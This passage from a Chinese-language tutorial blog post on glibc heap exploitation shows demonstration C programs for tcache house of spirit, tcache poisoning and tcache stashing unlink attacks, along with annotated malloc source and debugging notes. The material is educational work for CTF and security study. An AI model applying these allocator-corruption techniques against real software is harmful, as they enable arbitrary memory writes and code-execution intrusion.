                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111750815.png"
                      alt="image-20231015111750815"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111900959.png"
                      alt="image-20231015111900959"
                ></p>
<p>此时申请 <code>0x120</code> 大小的 <code>chunk</code> 将 <code>unsorted_bin</code> 中包含 <code>chunk_a_fd</code> 的 <code>chunk</code> 申请出来，我们就可以修改 <code>tcache</code> 中 <code>chunk_a</code> 的下一个链接进来的 <code>chunk</code> 为我们伪造的 <code>chunk</code>，在申请两次用户区为 <code>0x100</code> 大小的 <code>chunk</code> 就可以将我们伪造的 <code>chunk</code> 申请出来。</p>
<h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="源码-21"><a href="#源码-21" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调试-21"><a href="#调试-21" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015121919702.png"
                      alt="image-20231015121919702"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015121949906.png"
                      alt="image-20231015121949906"
                ></p>
<p>这种利用能够方法很简单，只需要将 <code>fake_chunks_size=0x40</code>，然后 <code>free(fake_chunk)</code> 即可将其放入到 <code>tcache</code> 中，再去申请 <code>0x30</code> 大小的 <code>chunk</code> 即可将其申请出来。</p>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="源码-22"><a href="#源码-22" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-22"><a href="#调试-22" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015125946150.png"
                      alt="image-20231015125946150"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130236228.png"
                      alt="image-20231015130236228"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130341804.png"
                      alt="image-20231015130341804"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130255142.png"
                      alt="image-20231015130255142"
                ></p>
<p>申请同样大小的 <code>a,b</code> 两个 <code>chunk</code>，并将其放在 <code>tcache</code> 中。然后将后进入的 <code>chunk_b_fd</code> 改为 <code>stack_var_fd</code>，这样就能将其链接进 <code>tcache</code>，<code>tcache</code> 的数量为 <code>2</code>，可以申请两个 <code>chunk</code> 出来。 在 <code>2.29</code> 以后，如果 <code>tcache</code> 的数量为 <code>0</code>，就算 <code>tcache</code> 中有 <code>free_chunk</code> 也不会将其取出来，所以我们确保 <code>tcache</code> 的数量为 <code>2</code>，这样就能取出两个 <code>chunk</code>。</p>
<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2><p>利用 <code>calloc</code> 可以越过 <code>tcache</code> 取 <code>chunk</code> 的特点结合 <code>house of lore</code> 进行的攻击手段，可以向任意地址写入任意值，也可以申请任意地址。</p>
<h3 id="源码-23"><a href="#源码-23" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE <span class="comment">//如果程序启用了Tcache</span></span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">        stash them in the tcache.  */</span></span><br><span class="line">        <span class="comment">//遍历整个smallbin，获取相同size的free chunk</span></span><br><span class="line">        <span class="type">size_t</span> tc_idx = <span class="built_in">csize2tidx</span> (nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="comment">//判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。</span></span><br><span class="line">            <span class="comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span class="line">            <span class="keyword">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                   &amp;&amp; (tc_victim = <span class="built_in">last</span> (bin) ) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//如果成功获取了Chunk</span></span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    <span class="comment">//设置标志位</span></span><br><span class="line">                    <span class="built_in">set_inuse_bit_at_offset</span> (tc_victim, nb);</span><br><span class="line">                    <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        <span class="built_in">set_non_main_arena</span> (tc_victim);</span><br><span class="line">                    <span class="comment">//取出最后一个Chunk</span></span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line">                    <span class="comment">//将其放入到Tcache中</span></span><br><span class="line">                    <span class="built_in">tcache_put</span> (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>可以看到，这种攻击手段并没有经过 <code>house of lore</code> 的需要经过的验证，即没有这一个要求 <code> bck-&gt;fd == victim</code>。</p>
<h3 id="调试-23"><a href="#调试-23" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015135526620.png"
                      alt="image-20231015135526620"
                ></p>
<p>目标地址的 <code>stack_var_bk == stack_var_fd</code>，为了后续将 <code>fake_chunk</code> 的 <code>bk</code> 指针指向一块可写的内存，绕过 <code>glibc</code> 在摘链表时候的检查，样例中我们在 <code>small_bin</code> 中摘取两个 <code>chunk</code> 放入 <code>tcache</code> ，<code>tcache</code>便已经满了，不会再去索取 <code>fake_chunk_bk</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140157626.png"
